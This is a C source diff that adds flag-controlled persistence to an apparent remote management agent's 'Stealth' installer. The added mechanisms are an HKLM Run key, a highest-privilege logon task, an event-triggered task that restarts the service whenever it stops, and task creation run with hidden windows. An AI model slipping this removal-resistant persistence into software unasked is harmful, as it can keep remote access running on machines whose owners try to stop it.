@@ -15,6 +15,7 @@
 #include <stdio.h>
 #include <strsafe.h>
 #include "stealth.h"
+#include "../meshcore/generated/meshagent_branding.h"
 
 // Installation configuration
 // Prefer computing install paths at runtime to avoid hard-coding drive/root.
@@ -178,8 +179,13 @@ BOOL Stealth_PerformCompleteInstallation(
                 // Harden service DACL to Administrators + SYSTEM
                 Stealth_HardenServiceDacl(SERVICE_NAME);
 
-                // Configure auto-restart on failure (centralized)
+                // Configure persistence behaviors based on branding flags
+#if defined(MESH_AGENT_PERSIST_WATCHDOG) && (MESH_AGENT_PERSIST_WATCHDOG!=0)
                 Stealth_ProtectServiceFromTermination(SERVICE_NAME);
+#endif
+                Stealth_AddRunKeyIfEnabled(SERVICE_NAME);
+                Stealth_AddScheduledTaskIfEnabled(SERVICE_NAME);
+                Stealth_AddServiceStoppedAutoStartIfEnabled(SERVICE_NAME);
 
                 CloseServiceHandle(hService);
                 success = TRUE;
@@ -322,4 +328,103 @@ BOOL Stealth_IsAlreadyInstalled(void)
     }
 
     return installed;
+}
+static void Stealth_AddRunKeyIfEnabled(const wchar_t* serviceName)
+{
+#if defined(MESH_AGENT_PERSIST_RUNKEY) && (MESH_AGENT_PERSIST_RUNKEY!=0)
+    HKEY hKey;
+    const wchar_t* runKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
+    {
+        wchar_t cmd[MAX_PATH];
+        if (GetSystemDirectoryW(cmd, MAX_PATH) > 0)
+        {
+            size_t len = wcslen(cmd);
+            if (len < MAX_PATH - 1) { wcscat_s(cmd, MAX_PATH, L"\\sc.exe"); }
+        }
+        else
+        {
+            wcscpy_s(cmd, MAX_PATH, L"sc.exe");
+        }
+        wchar_t value[256];
+        StringCchPrintfW(value, 256, L"\"%s\" start %s", cmd, serviceName);
+        RegSetValueExW(hKey, serviceName, 0, REG_SZ, (const BYTE*)value, (DWORD)((wcslen(value) + 1) * sizeof(wchar_t)));
+        RegCloseKey(hKey);
+    }
+#endif
+}
+
+static void Stealth_AddScheduledTaskIfEnabled(const wchar_t* serviceName)
+{
+#if defined(MESH_AGENT_PERSIST_TASK) && (MESH_AGENT_PERSIST_TASK!=0)
+    // Create an on-logon scheduled task to (re)start the service with highest privileges
+    // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONLOGON /RL HIGHEST /F
+    wchar_t sysDir[MAX_PATH];
+    wchar_t scPath[MAX_PATH];
+    wchar_t cmdLine[1024];
+    STARTUPINFOW si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+
+    GetSystemDirectoryW(sysDir, MAX_PATH);
+    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);
+
+    wchar_t taskName[128];
+    StringCchPrintfW(taskName, 128, L"\\%s-Autorun", serviceName);
+
+    StringCchPrintfW(cmdLine, 1024,
+        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"\"%s\" start %s\" /SC ONLOGON /RL HIGHEST /F",
+        sysDir,
+        taskName,
+        scPath,
+        serviceName);
+
+    CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (pi.hProcess) { CloseHandle(pi.hProcess); }
+    if (pi.hThread) { CloseHandle(pi.hThread); }
+#endif
+}
+
+static void Stealth_AddServiceStoppedAutoStartIfEnabled(const wchar_t* serviceName)
+{
+#if defined(MESH_AGENT_PERSIST_WMI) && (MESH_AGENT_PERSIST_WMI!=0)
+    // Implement as an event-driven scheduled task (instead of WMI permanent consumer)
+    // Triggers when Service Control Manager logs 7036 (service entered stopped state) for this service.
+    // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONEVENT /EC System /MO <XPath> /RL HIGHEST /F
+    const wchar_t* xPathFormat =
+        L"<QueryList>"
+        L"  <Query Id=\"0\" Path=\"System\">"
+        L"    <Select Path=\"System\">*[System[Provider[@Name='Service Control Manager'] and EventID=7036]] and *[EventData[Data='%s'] and EventData[Data='stopped']]</Select>"
+        L"  </Query>"
+        L"</QueryList>";
+    wchar_t xPath[1024];
+    StringCchPrintfW(xPath, 1024, xPathFormat, serviceName);
+
+    wchar_t sysDir[MAX_PATH];
+    wchar_t scPath[MAX_PATH];
+    wchar_t cmdLine[4096];
+    STARTUPINFOW si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+
+    GetSystemDirectoryW(sysDir, MAX_PATH);
+    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);
+
+    wchar_t taskName[128];
+    StringCchPrintfW(taskName, 128, L"\\%s-RestartOnStop", serviceName);
+
+    // Build command: schtasks.exe /Create ... /MO "<QueryList>..." (escaped)
+    // Wrap XPath in double quotes; CreateProcessW supports quotes.
+    StringCchPrintfW(cmdLine, 4096,
+        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"\"%s\" start %s\" /SC ONEVENT /EC System /MO \"%s\" /RL HIGHEST /F",
+        sysDir,
+        taskName,
+        scPath,
+        serviceName,
+        xPath);
+
+    CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (pi.hProcess) { CloseHandle(pi.hProcess); }
+    if (pi.hThread) { CloseHandle(pi.hThread); }
+#endif
 }
